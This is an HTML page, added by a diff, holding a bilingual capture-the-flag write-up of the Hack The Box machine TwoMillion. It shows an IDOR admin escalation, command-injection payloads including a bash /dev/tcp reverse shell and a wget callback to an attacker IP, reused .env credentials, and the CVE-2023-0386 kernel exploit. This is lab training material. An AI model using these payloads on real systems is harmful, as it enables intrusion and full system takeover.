@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>twomillion | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">twomillion</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a custom web application mimicking the old HackTheBox invite system. Through API enumeration, I discovered hidden endpoints including <code>/api/v1/invite/how/to/generate</code>, which revealed a method to generate valid invitation codes. After registering and authenticating, further API discovery exposed administrative endpoints at <code>/api/v1/admin</code>.</p>
+                    
+                    <p>By exploiting an Insecure Direct Object Reference (IDOR) vulnerability in the <code>PUT /api/v1/admin/settings/update</code> endpoint, I escalated my user privileges to administrator. This granted access to the <code>/api/v1/admin/vpn/generate</code> endpoint, which was vulnerable to command injection through the <code>username</code> parameter, allowing me to obtain a reverse shell as <code>www-data</code>.</p>
+                    
+                    <p>Credentials found in a <code>.env</code> file (<code>admin:SuperDuperPass123</code>) provided SSH access as the <code>admin</code> user. The final privilege escalation leveraged CVE-2023-0386, a kernel vulnerability in the OverlayFS filesystem affecting Linux kernel version 5.15.70. This vulnerability allows unprivileged users to gain root access by exploiting improper permission handling when mounting overlayfs filesystems, ultimately providing a root shell.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> API enumeration and fuzzing, IDOR vulnerability exploitation, OS command injection, credential exposure via configuration files, Linux kernel privilege escalation via CVE-2023-0386 (OverlayFS vulnerability).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services on the target machine:</p>
+                <p><img src="./media/image14.png"
+                        alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 80" />
+                </p>
+
+                <p>The scan reveals SSH running on port 22 and an HTTP server on port 80. I'll focus on the web application first to identify potential attack vectors.</p>
+
+                <h2>Web Enumeration - Initial Discovery</h2>
+                <p>Running gobuster to discover web directories and endpoints:</p>
+                <p><img src="./media/image13.png"
+                        alt="Gobuster results showing discovered directories including /api endpoint" />
+                </p>
+
+                <p>Gobuster discovers several interesting paths, including an <code>/api</code> endpoint. I continue enumeration by scanning <code>/api</code> and discover <code>/api/v1</code>, though further scanning doesn't reveal additional paths at this level.</p>
+
+                <p>The main page features a login panel, but I don't have credentials yet, and SQL injection attempts don't yield results. While manually browsing the application, I find a route that gobuster might have missed: <code>http://2million.htb/invite</code></p>
+
+                <p><img src="./media/image11.png"
+                        alt="Invite code page showing a form requesting an invitation code" />
+                </p>
+
+                <h2>API Exploitation - Generating Invitation Codes</h2>
+                <p>The invite page submits a POST request to <code>http://2million.htb/api/v1/invite/verify</code>. I open Burp Suite to intercept and manipulate the requests, testing various injection techniques without immediate success.</p>
+
+                <p>Deciding to fuzz the <code>/api/v1/invite</code> endpoint for other HTTP methods, I discover something interesting:</p>
+                <p><img src="./media/image2.png"
+                        alt="Fuzzing results showing POST method available on /api/v1/invite/how/to/generate" />
+                </p>
+
+                <p>Testing this endpoint with Burp Suite:</p>
+                <p><img src="./media/image10.png"
+                        alt="Burp Suite showing response with base64-encoded data from the invite generation endpoint" />
+                </p>
+
+                <p>The response appears to be base64-encoded. After decoding, I obtain what looks like an invitation code:</p>
+                <pre><code class="language-plaintext">S4YRN-JK2X7-O3SY7-UYB99</code></pre>
+
+                <p>Using this code, I successfully register an account and gain access to the application.</p>
+
+                <h2>API Discovery - Administrative Endpoints</h2>
+                <p>After logging in, I explore the application and run another gobuster scan:</p>
+                <p><img src="./media/image12.png"
+                        alt="Gobuster results showing /access endpoint" />
+                </p>
+
+                <p>The most interesting finding is the <code>/access</code> page, where users can download and regenerate OpenVPN configuration files. The interesting part is the API routes being used:</p>
+                <ul>
+                    <li><code>/api/v1/user/vpn/generate</code></li>
+                    <li><code>/api/v1/user/vpn/regenerate</code></li>
+                </ul>
+
+                <p>I run gobuster on <code>/api/v1/user</code> and discover an <code>/auth</code> endpoint:</p>
+                <p><img src="./media/image9.png"
+                        alt="Authentication check endpoint showing current user is not admin" />
+                </p>
+
+                <p>This suggests there must be a way to escalate privileges to administrator. Testing a POST request to this endpoint fails as the method isn't supported.</p>
+
+                <h3>Finding the Admin API</h3>
+                <p>Using ffuf to fuzz for alternative API paths, I discover that <code>admin</code> can be used instead of <code>user</code>:</p>
+                <p><img src="./media/image4.png"
+                        alt="Fuzzing results showing /api/v1/admin endpoints" />
+                </p>
+
+                <p>Accessing <code>/api/v1/admin/auth</code> reveals:</p>
+                <p><img src="./media/image7.png"
+                        alt="Admin authentication check showing current user is not admin" />
+                </p>
+
+                <p>Attempting POST requests to <code>/api/v1/admin/auth</code> fails. However, <code>/api/v1/admin/vpn/generate</code> returns a 401 Unauthorized response when accessed via POST, indicating the endpoint exists but requires admin privileges.</p>
+
+                <h3>Complete API Mapping</h3>
+                <p>Checking <code>/api/v1</code> directly reveals the complete list of available routes:</p>
+                <p><img src="./media/image8.png"
+                        alt="Complete API endpoint listing showing all available routes including admin endpoints" />
+                </p>
+
+                <p>The <code>PUT /api/v1/admin/settings/update</code> endpoint stands out as particularly interesting for privilege escalation.</p>
+
+                <h2>Privilege Escalation to Admin - IDOR Vulnerability</h2>
+                <p>Testing the settings update endpoint, I craft a PUT request to modify my user's admin status:</p>
+                <p><img src="./media/image3.png"
+                        alt="Burp Suite request showing successful privilege escalation by setting is_admin to 1" />
+                </p>
+
+                <p>By sending a PUT request with JSON data <code>{"is_admin": 1}</code>, I successfully escalate my privileges to administrator. This is a classic Insecure Direct Object Reference (IDOR) vulnerability where the application fails to properly validate whether the authenticated user should be allowed to modify their own admin status.</p>
+
+                <h2>Command Injection - Initial Access</h2>
+                <p>Now with admin access, I focus on the <code>/api/v1/admin/vpn/generate</code> endpoint. Since the VPN files don't contain useful information and the username parameter seems arbitrary, I test for command injection vulnerabilities.</p>
+
+                <p>Testing with <code>||</code> returns no output, which raises suspicion that command injection might be possible. I verify this by attempting to trigger an HTTP request back to my machine:</p>
+
+                <pre><code class="language-bash">curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "PHPSESSID=6emcqoc5thc6m131g2t1ncordu" \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "xd && wget 10.10.14.239:8000"}'</code></pre>
+
+                <p>Starting a Python HTTP server on my machine:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>I receive the connection, confirming command injection:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.221 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <h3>Obtaining a Reverse Shell</h3>
+                <p>Now that command injection is confirmed, I craft a reverse shell payload:</p>
+
+                <pre><code class="language-bash">curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "PHPSESSID=6emcqoc5thc6m131g2t1ncordu" \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "xd && bash -c \"bash -i >& /dev/tcp/10.10.14.239/443 0>&1\""}'</code></pre>
+
+                <p>Setting up a netcat listener:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>I successfully receive a reverse shell as <code>www-data</code>:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.14.239] from (UNKNOWN) [10.10.11.221] 48172
+bash: cannot set terminal process group (1195): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$</code></pre>
+
+                <h2>Lateral Movement - Credential Discovery</h2>
+                <p>In the <code>www-data</code> home directory, I discover a <code>.env</code> file containing database credentials:</p>
+
+                <pre><code class="language-plaintext">DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123</code></pre>
+
+                <p>While exploring the database reveals three interesting users, attempting to crack their hashes doesn't immediately succeed. However, testing the database password for system authentication proves successful.</p>
+
+                <h3>Port Analysis</h3>
+                <p>Checking for locally-bound services with <code>ss -tuln</code>:</p>
+
+                <pre><code class="language-plaintext">www-data@2million:~/html$ ss -tuln
+Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*
+udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*
+tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*
+tcp LISTEN 0 1024 127.0.0.1:11211 0.0.0.0:*
+tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:*
+tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*
+tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
+tcp LISTEN 0 511 [::]:80 [::]:*
+tcp LISTEN 0 128 [::]:22 [::]:*</code></pre>
+
+                <p>Port 11211 stands out as potentially interesting - this is typically memcached. Connecting via telnet reveals version 1.6.14, which has a known buffer overflow vulnerability (CVE-2023-46852), though it doesn't appear immediately useful for this scenario.</p>
+
+                <h3>SSH Access as Admin</h3>
+                <p>Testing the database password with the <code>admin</code> user proves successful:</p>
+                <pre><code class="language-bash">ssh admin@2million.htb
+# Password: SuperDuperPass123</code></pre>
+
+                <p>I now have SSH access as the <code>admin</code> user and can retrieve the user flag from <code>/home/admin/user.txt</code>.</p>
+
+                <h2>Privilege Escalation to Root - CVE-2023-0386</h2>
+                <p>Checking the kernel version:</p>
+                <pre><code class="language-bash">admin@2million:~$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
+
+                <p>This kernel version is vulnerable to CVE-2023-0386, an OverlayFS privilege escalation vulnerability. According to the <a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">security analysis</a>, this exploit leverages the OverlayFS mount system to copy SUID binaries to locations where they shouldn't normally be accessible.</p>
+
+                <h3>Understanding CVE-2023-0386</h3>
+                <p>The vulnerability exists in the Linux kernel's OverlayFS implementation. OverlayFS is a union filesystem that allows multiple directories to be combined into a single view. The vulnerability stems from improper permission handling when mounting overlayfs filesystems, allowing an unprivileged user to gain write access to files that should be restricted.</p>
+
+                <p>The exploit works by:</p>
+                <ol>
+                    <li>Creating a malicious OverlayFS mount with crafted permissions</li>
+                    <li>Exploiting the kernel's improper validation to gain elevated access to SUID binaries</li>
+                    <li>Leveraging this access to execute code as root</li>
+                </ol>
+
+                <h3>Exploiting the Vulnerability</h3>
+                <p>I download a proof-of-concept exploit from <a href="https://github.com/puckiestyle/CVE-2023-0386">GitHub</a>, transfer it to the target machine, and compile it:</p>
+
+                <pre><code class="language-bash">make all</code></pre>
+
+                <p>The exploit requires two terminal sessions. In the first SSH session, I execute the setup script:</p>
+                <p><img src="./media/image5.png"
+                        alt="First terminal showing the execution of the fuse exploit component" />
+                </p>
+
+                <p>In the second SSH session, I run the privilege escalation component:</p>
+                <p><img src="./media/image15.png"
+                        alt="Second terminal showing the execution of the main exploit component" />
+                </p>
+
+                <p>The exploit successfully escalates privileges, granting me a root shell:</p>
+                <p><img src="./media/image6.png"
+                        alt="Root shell obtained showing uid=0(root) and the root flag" />
+                </p>
+
+                <p>With root access, I can now retrieve the root flag from <code>/root/root.txt</code> and have complete control over the system.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Proceso de explotación:</strong> La máquina objetivo ejecutaba una aplicación web personalizada que imitaba el antiguo sistema de invitaciones de HackTheBox. A través de la enumeración de APIs, descubrí endpoints ocultos incluyendo <code>/api/v1/invite/how/to/generate</code>, que revelaba un método para generar códigos de invitación válidos. Tras registrarme y autenticarme, una mayor exploración de la API expuso endpoints administrativos en <code>/api/v1/admin</code>.</p>
+                    
+                    <p>Explotando una vulnerabilidad de Referencia Directa a Objetos Insegura (IDOR) en el endpoint <code>PUT /api/v1/admin/settings/update</code>, escalé los privilegios de mi usuario a administrador. Esto otorgó acceso al endpoint <code>/api/v1/admin/vpn/generate</code>, que era vulnerable a inyección de comandos a través del parámetro <code>username</code>, permitiéndome obtener una reverse shell como <code>www-data</code>.</p>
+                    
+                    <p>Las credenciales encontradas en un archivo <code>.env</code> (<code>admin:SuperDuperPass123</code>) proporcionaron acceso SSH como usuario <code>admin</code>. La escalada final de privilegios aprovechó CVE-2023-0386, una vulnerabilidad del kernel en el sistema de archivos OverlayFS que afecta a la versión 5.15.70 del kernel de Linux. Esta vulnerabilidad permite a usuarios sin privilegios obtener acceso root explotando el manejo inadecuado de permisos al montar sistemas de archivos overlayfs, proporcionando finalmente una shell de root.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Enumeración y fuzzing de APIs, explotación de vulnerabilidad IDOR, inyección de comandos del sistema operativo, exposición de credenciales mediante archivos de configuración, escalada de privilegios del kernel de Linux mediante CVE-2023-0386 (vulnerabilidad de OverlayFS).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios en la máquina objetivo:</p>
+                <p><img src="./media/image14.png"
+                        alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 80" />
+                </p>
+
+                <p>El escaneo revela SSH ejecutándose en el puerto 22 y un servidor HTTP en el puerto 80. Me centraré primero en la aplicación web para identificar vectores de ataque potenciales.</p>
+
+                <h2>Enumeración Web - Descubrimiento Inicial</h2>
+                <p>Ejecuto gobuster para descubrir directorios y endpoints web:</p>
+                <p><img src="./media/image13.png"
+                        alt="Resultados de gobuster mostrando directorios descubiertos incluyendo el endpoint /api" />
+                </p>
+
+                <p>Gobuster descubre varias rutas interesantes, incluyendo un endpoint <code>/api</code>. Continúo la enumeración escaneando <code>/api</code> y descubro <code>/api/v1</code>, aunque el escaneo posterior no revela rutas adicionales en este nivel.</p>
+
+                <p>La página principal muestra un panel de login, pero no tengo credenciales aún, y los intentos de inyección SQL no arrojan resultados. Mientras navego manualmente por la aplicación, encuentro una ruta que gobuster podría haberse perdido: <code>http://2million.htb/invite</code></p>
+
+                <p><img src="./media/image11.png"
+                        alt="Página de código de invitación mostrando un formulario solicitando un código de invitación" />
+                </p>
+
+                <h2>Explotación de API - Generando Códigos de Invitación</h2>
+                <p>La página de invitación envía una petición POST a <code>http://2million.htb/api/v1/invite/verify</code>. Abro Burp Suite para interceptar y manipular las peticiones, probando varias técnicas de inyección sin éxito inmediato.</p>
+
+                <p>Decidiendo hacer fuzzing en el endpoint <code>/api/v1/invite</code> para otros métodos HTTP, descubro algo interesante:</p>
+                <p><img src="./media/image2.png"
+                        alt="Resultados del fuzzing mostrando método POST disponible en /api/v1/invite/how/to/generate" />
+                </p>
+
+                <p>Probando este endpoint con Burp Suite:</p>
+                <p><img src="./media/image10.png"
+                        alt="Burp Suite mostrando respuesta con datos codificados en base64 desde el endpoint de generación de invitaciones" />
+                </p>
+
+                <p>La respuesta parece estar codificada en base64. Tras decodificarla, obtengo lo que parece un código de invitación:</p>
+                <pre><code class="language-plaintext">S4YRN-JK2X7-O3SY7-UYB99</code></pre>
+
+                <p>Usando este código, registro exitosamente una cuenta y obtengo acceso a la aplicación.</p>
+
+                <h2>Descubrimiento de API - Endpoints Administrativos</h2>
+                <p>Tras iniciar sesión, exploro la aplicación y ejecuto otro escaneo de gobuster:</p>
+                <p><img src="./media/image12.png"
+                        alt="Resultados de gobuster mostrando el endpoint /access" />
+                </p>
+
+                <p>El hallazgo más interesante es la página <code>/access</code>, donde los usuarios pueden descargar y regenerar archivos de configuración OpenVPN. La parte interesante son las rutas de la API que se están utilizando:</p>
+                <ul>
+                    <li><code>/api/v1/user/vpn/generate</code></li>
+                    <li><code>/api/v1/user/vpn/regenerate</code></li>
+                </ul>
+
+                <p>Ejecuto gobuster en <code>/api/v1/user</code> y descubro un endpoint <code>/auth</code>:</p>
+                <p><img src="./media/image9.png"
+                        alt="Endpoint de comprobación de autenticación mostrando que el usuario actual no es administrador" />
+                </p>
+
+                <p>Esto sugiere que debe haber una forma de escalar privilegios a administrador. Probar una petición POST a este endpoint falla ya que el método no está soportado.</p>
+
+                <h3>Encontrando la API de Admin</h3>
+                <p>Usando ffuf para hacer fuzzing de rutas alternativas de la API, descubro que <code>admin</code> puede usarse en lugar de <code>user</code>:</p>
+                <p><img src="./media/image4.png"
+                        alt="Resultados del fuzzing mostrando endpoints en /api/v1/admin" />
+                </p>
+
+                <p>Accediendo a <code>/api/v1/admin/auth</code> revela:</p>
+                <p><img src="./media/image7.png"
+                        alt="Comprobación de autenticación de admin mostrando que el usuario actual no es administrador" />
+                </p>
+
+                <p>Intentar peticiones POST a <code>/api/v1/admin/auth</code> falla. Sin embargo, <code>/api/v1/admin/vpn/generate</code> devuelve una respuesta 401 No Autorizado al acceder mediante POST, indicando que el endpoint existe pero requiere privilegios de administrador.</p>
+
+                <h3>Mapeo Completo de la API</h3>
+                <p>Comprobando <code>/api/v1</code> directamente se revela la lista completa de rutas disponibles:</p>
+                <p><img src="./media/image8.png"
+                        alt="Listado completo de endpoints de la API mostrando todas las rutas disponibles incluyendo endpoints de admin" />
+                </p>
+
+                <p>El endpoint <code>PUT /api/v1/admin/settings/update</code> destaca como particularmente interesante para la escalada de privilegios.</p>
+
+                <h2>Escalada de Privilegios a Admin - Vulnerabilidad IDOR</h2>
+                <p>Probando el endpoint de actualización de configuración, elaboro una petición PUT para modificar el estado de administrador de mi usuario:</p>
+                <p><img src="./media/image3.png"
+                        alt="Petición de Burp Suite mostrando escalada de privilegios exitosa estableciendo is_admin a 1" />
+                </p>
+
+                <p>Enviando una petición PUT con datos JSON <code>{"is_admin": 1}</code>, escalo exitosamente mis privilegios a administrador. Esta es una vulnerabilidad clásica de Referencia Directa a Objetos Insegura (IDOR) donde la aplicación falla en validar apropiadamente si el usuario autenticado debería poder modificar su propio estado de administrador.</p>
+
+                <h2>Inyección de Comandos - Acceso Inicial</h2>
+                <p>Ahora con acceso de administrador, me centro en el endpoint <code>/api/v1/admin/vpn/generate</code>. Como los archivos VPN no contienen información útil y el parámetro username parece arbitrario, pruebo vulnerabilidades de inyección de comandos.</p>
+
+                <p>Probar con <code>||</code> no devuelve salida, lo que levanta sospechas de que la inyección de comandos podría ser posible. Verifico esto intentando desencadenar una petición HTTP de vuelta a mi máquina:</p>
+
+                <pre><code class="language-bash">curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "PHPSESSID=6emcqoc5thc6m131g2t1ncordu" \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "xd && wget 10.10.14.239:8000"}'</code></pre>
+
+                <p>Iniciando un servidor HTTP de Python en mi máquina:</p>
+                <pre><code class="language-bash">python3 -m http.server</code></pre>
+
+                <p>Recibo la conexión, confirmando la inyección de comandos:</p>
+                <pre><code class="language-plaintext">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.11.221 - - "GET / HTTP/1.1" 200 -</code></pre>
+
+                <h3>Obteniendo una Reverse Shell</h3>
+                <p>Ahora que la inyección de comandos está confirmada, elaboro un payload de reverse shell:</p>
+
+                <pre><code class="language-bash">curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
+  --cookie "PHPSESSID=6emcqoc5thc6m131g2t1ncordu" \
+  -H 'Content-Type: application/json' \
+  -d '{"username": "xd && bash -c \"bash -i >& /dev/tcp/10.10.14.239/443 0>&1\""}'</code></pre>
+
+                <p>Configurando un listener de netcat:</p>
+                <pre><code class="language-bash">sudo nc -lvnp 443</code></pre>
+
+                <p>Recibo exitosamente una reverse shell como <code>www-data</code>:</p>
+                <pre><code class="language-bash">listening on [any] 443 ...
+connect to [10.10.14.239] from (UNKNOWN) [10.10.11.221] 48172
+bash: cannot set terminal process group (1195): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2million:~/html$</code></pre>
+
+                <h2>Movimiento Lateral - Descubrimiento de Credenciales</h2>
+                <p>En el directorio home de <code>www-data</code>, descubro un archivo <code>.env</code> conteniendo credenciales de base de datos:</p>
+
+                <pre><code class="language-plaintext">DB_HOST=127.0.0.1
+DB_DATABASE=htb_prod
+DB_USERNAME=admin
+DB_PASSWORD=SuperDuperPass123</code></pre>
+
+                <p>Aunque explorar la base de datos revela tres usuarios interesantes, intentar crackear sus hashes no tiene éxito inmediato. Sin embargo, probar la contraseña de la base de datos para autenticación del sistema resulta exitoso.</p>
+
+                <h3>Análisis de Puertos</h3>
+                <p>Comprobando servicios enlazados localmente con <code>ss -tuln</code>:</p>
+
+                <pre><code class="language-plaintext">www-data@2million:~/html$ ss -tuln
+Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process
+udp UNCONN 0 0 127.0.0.53%lo:53 0.0.0.0:*
+udp UNCONN 0 0 0.0.0.0:68 0.0.0.0:*
+tcp LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*
+tcp LISTEN 0 1024 127.0.0.1:11211 0.0.0.0:*
+tcp LISTEN 0 511 0.0.0.0:80 0.0.0.0:*
+tcp LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:*
+tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:*
+tcp LISTEN 0 511 [::]:80 [::]:*
+tcp LISTEN 0 128 [::]:22 [::]:*</code></pre>
+
+                <p>El puerto 11211 destaca como potencialmente interesante - esto es típicamente memcached. Conectándome mediante telnet revela la versión 1.6.14, que tiene una vulnerabilidad conocida de desbordamiento de búfer (CVE-2023-46852), aunque no parece inmediatamente útil para este escenario.</p>
+
+                <h3>Acceso SSH como Admin</h3>
+                <p>Probar la contraseña de la base de datos con el usuario <code>admin</code> resulta exitoso:</p>
+                <pre><code class="language-bash">ssh admin@2million.htb
+# Contraseña: SuperDuperPass123</code></pre>
+
+                <p>Ahora tengo acceso SSH como usuario <code>admin</code> y puedo recuperar la flag de usuario desde <code>/home/admin/user.txt</code>.</p>
+
+                <h2>Escalada de Privilegios a Root - CVE-2023-0386</h2>
+                <p>Comprobando la versión del kernel:</p>
+                <pre><code class="language-bash">admin@2million:~$ uname -a
+Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</code></pre>
+
+                <p>Esta versión del kernel es vulnerable a CVE-2023-0386, una vulnerabilidad de escalada de privilegios de OverlayFS. Según el <a href="https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/">análisis de seguridad</a>, este exploit aprovecha el sistema de montaje de OverlayFS para copiar binarios SUID a ubicaciones donde normalmente no deberían ser accesibles.</p>
+
+                <h3>Entendiendo CVE-2023-0386</h3>
+                <p>La vulnerabilidad existe en la implementación de OverlayFS del kernel de Linux. OverlayFS es un sistema de archivos de unión que permite combinar múltiples directorios en una única vista. La vulnerabilidad surge del manejo inadecuado de permisos al montar sistemas de archivos overlayfs, permitiendo a un usuario sin privilegios obtener acceso de escritura a archivos que deberían estar restringidos.</p>
+
+                <p>El exploit funciona mediante:</p>
+                <ol>
+                    <li>Creando un montaje malicioso de OverlayFS con permisos manipulados</li>
+                    <li>Explotando la validación inadecuada del kernel para obtener acceso elevado a binarios SUID</li>
+                    <li>Aprovechando este acceso para ejecutar código como root</li>
+                </ol>
+
+                <h3>Explotando la Vulnerabilidad</h3>
+                <p>Descargo una prueba de concepto del exploit desde <a href="https://github.com/puckiestyle/CVE-2023-0386">GitHub</a>, la transfiero a la máquina objetivo y la compilo:</p>
+
+                <pre><code class="language-bash">make all</code></pre>
+
+                <p>El exploit requiere dos sesiones de terminal. En la primera sesión SSH, ejecuto el script de configuración:</p>
+                <p><img src="./media/image5.png"
+                        alt="Primer terminal mostrando la ejecución del componente fuse del exploit" />
+                </p>
+
+                <p>En la segunda sesión SSH, ejecuto el componente de escalada de privilegios:</p>
+                <p><img src="./media/image15.png"
+                        alt="Segundo terminal mostrando la ejecución del componente principal del exploit" />
+                </p>
+
+                <p>El exploit escala exitosamente los privilegios, otorgándome una shell de root:</p>
+                <p><img src="./media/image6.png"
+                        alt="Shell de root obtenida mostrando uid=0(root) y la flag de root" />
+                </p>
+
+                <p>Con acceso root, ahora puedo recuperar la flag de root desde <code>/root/root.txt</code> y tengo control completo sobre el sistema.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
